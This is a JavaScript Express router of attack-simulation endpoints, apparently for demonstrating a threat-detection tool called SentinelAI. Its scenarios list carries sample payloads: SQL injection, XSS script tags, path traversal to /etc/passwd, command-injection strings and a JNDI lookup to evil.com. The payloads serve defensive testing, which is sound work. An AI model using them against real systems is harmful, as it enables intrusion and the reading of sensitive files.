const express = require('express');
const router = express.Router();

/**
 * Attack Simulation Endpoints
 * These endpoints help demonstrate SentinelAI's threat detection capabilities
 */

// Test: Normal safe request
router.post('/safe', (req, res) => {
  res.json({
    test: 'safe_request',
    result: 'This is a normal, safe request that should be allowed',
    data: req.body
  });
});

// Test: SQL Injection attempts
router.post('/sql-injection', (req, res) => {
  res.json({
    test: 'sql_injection',
    result: 'If you see this, the attack was not blocked',
    warning: 'This endpoint simulates SQL injection attacks'
  });
});

// Test: XSS attempts
router.post('/xss-attack', (req, res) => {
  res.json({
    test: 'xss_attack',
    result: 'If you see this, the XSS attack was not blocked',
    warning: 'This endpoint simulates XSS attacks'
  });
});

// Test: Admin access without auth
router.post('/unauthorized-admin', (req, res) => {
  res.json({
    test: 'unauthorized_admin',
    result: 'If you see this, unauthorized admin access was not blocked',
    warning: 'This endpoint simulates unauthorized access'
  });
});

// Test: Path traversal
router.post('/path-traversal', (req, res) => {
  res.json({
    test: 'path_traversal',
    result: 'If you see this, the path traversal attack was not blocked',
    warning: 'This endpoint simulates path traversal attacks'
  });
});

// Test: Command injection
router.post('/command-injection', (req, res) => {
  res.json({
    test: 'command_injection',
    result: 'If you see this, the command injection was not blocked',
    warning: 'This endpoint simulates command injection attacks'
  });
});

// Test: Rate limiting / DDoS simulation
router.post('/spam', (req, res) => {
  res.json({
    test: 'rate_limiting',
    result: 'Request processed',
    message: 'Send many requests quickly to trigger rate limiting'
  });
});

// Test: Advanced rate limiting burst
router.post('/burst-attack', (req, res) => {
  res.json({
    test: 'burst_attack',
    result: 'Burst request processed',
    message: 'Send rapid bursts to trigger advanced rate limiting'
  });
});

// Test: HTTP method anomaly
router.post('/method-anomaly', (req, res) => {
  res.json({
    test: 'method_anomaly',
    result: 'Method anomaly test',
    message: 'Tests HTTP method validation'
  });
});

// Test: Parameter anomaly
router.post('/param-anomaly', (req, res) => {
  res.json({
    test: 'param_anomaly',
    result: 'Parameter anomaly test',
    message: 'Tests parameter validation'
  });
});

// Test: Bot behavior simulation
router.post('/bot-simulation', (req, res) => {
  res.json({
    test: 'bot_simulation',
    result: 'Bot behavior test',
    message: 'Simulates bot-like behavior patterns'
  });
});

// Test: Threat intelligence patterns
router.post('/threat-intel', (req, res) => {
  res.json({
    test: 'threat_intelligence',
    result: 'Threat intelligence test',
    message: 'Tests threat intelligence detection'
  });
});

// Test: Zero-day pattern simulation
router.post('/zero-day', (req, res) => {
  res.json({
    test: 'zero_day',
    result: 'Zero-day pattern test',
    message: 'Tests zero-day vulnerability patterns'
  });
});

// Test: Session hijacking simulation
router.post('/session-hijack', (req, res) => {
  res.json({
    test: 'session_hijack',
    result: 'Session hijacking test',
    message: 'Tests session-based anomaly detection'
  });
});

// Test: Large payload
router.post('/large-payload', (req, res) => {
  res.json({
    test: 'large_payload',
    result: 'Large payload processed',
    size: JSON.stringify(req.body).length
  });
});

/**
 * Automated Attack Scenarios
 */
router.get('/scenarios', (req, res) => {
  res.json({
    scenarios: [
      {
        id: 1,
        name: 'SQL Injection',
        description: 'Attempts to inject SQL commands',
        endpoint: '/test/sql-injection',
        payload: {
          username: "admin' OR '1'='1",
          query: "SELECT * FROM users WHERE id=1 OR 1=1--"
        }
      },
      {
        id: 2,
        name: 'XSS Attack',
        description: 'Attempts to inject malicious scripts',
        endpoint: '/test/xss-attack',
        payload: {
          comment: "<script>alert('XSS')</script>",
          name: "<img src=x onerror=alert('XSS')>"
        }
      },
      {
        id: 3,
        name: 'Unauthorized Admin Access',
        description: 'Attempts to access admin endpoints',
        endpoint: '/api/admin/users',
        method: 'GET'
      },
      {
        id: 4,
        name: 'Path Traversal',
        description: 'Attempts to access sensitive files',
        endpoint: '/test/path-traversal',
        payload: {
          file: "../../etc/passwd",
          path: "../../../windows/system32"
        }
      },
      {
        id: 5,
        name: 'Command Injection',
        description: 'Attempts to execute system commands',
        endpoint: '/test/command-injection',
        payload: {
          command: "ls -la; cat /etc/passwd",
          input: "`whoami`"
        }
      },
      {
        id: 6,
        name: 'Rate Limit Test',
        description: 'Sends rapid requests to trigger rate limiting',
        endpoint: '/test/spam',
        payload: { data: 'test' },
        repeat: 100
      },
      {
        id: 7,
        name: 'Advanced Rate Limiting',
        description: 'Tests multi-window rate limiting with bursts',
        endpoint: '/test/burst-attack',
        payload: { test: 'burst' },
        repeat: 200
      },
      {
        id: 8,
        name: 'HTTP Method Anomaly',
        description: 'Tests HTTP method validation',
        endpoint: '/test/method-anomaly',
        method: 'DELETE',
        payload: { test: 'method' }
      },
      {
        id: 9,
        name: 'Parameter Anomaly',
        description: 'Tests parameter validation for suspicious values',
        endpoint: '/test/param-anomaly',
        payload: {
          amount: -100,
          id: 0,
          email: 'invalid..email@test'
        }
      },
      {
        id: 10,
        name: 'Bot Behavior Simulation',
        description: 'Simulates bot-like behavior patterns',
        endpoint: '/test/bot-simulation',
        payload: { user_agent: 'curl/7.68.0' }
      },
      {
        id: 11,
        name: 'Threat Intelligence Test',
        description: 'Tests threat intelligence detection',
        endpoint: '/test/threat-intel',
        payload: {
          pattern: '${jndi:ldap://evil.com/a}',
          ip: '192.42.115.100'
        }
      },
      {
        id: 12,
        name: 'Zero-Day Pattern',
        description: 'Tests zero-day vulnerability patterns',
        endpoint: '/test/zero-day',
        payload: {
          admin: 'true',
          user_id: '1',
          exec: 'whoami'
        }
      },
      {
        id: 13,
        name: 'Session Hijacking',
        description: 'Tests session-based anomaly detection',
        endpoint: '/test/session-hijack',
        payload: {
          session_id: 'hijacked_session',
          user_agent: 'different_browser'
        }
      }
    ]
  });
});

/**
 * Run automated attack simulation
 */
router.post('/simulate-attack', async (req, res) => {
  const { scenario } = req.body;
  
  res.json({
    message: 'Attack simulation started',
    scenario,
    note: 'Check the security dashboard to see threat detection in action'
  });
});

module.exports = router;
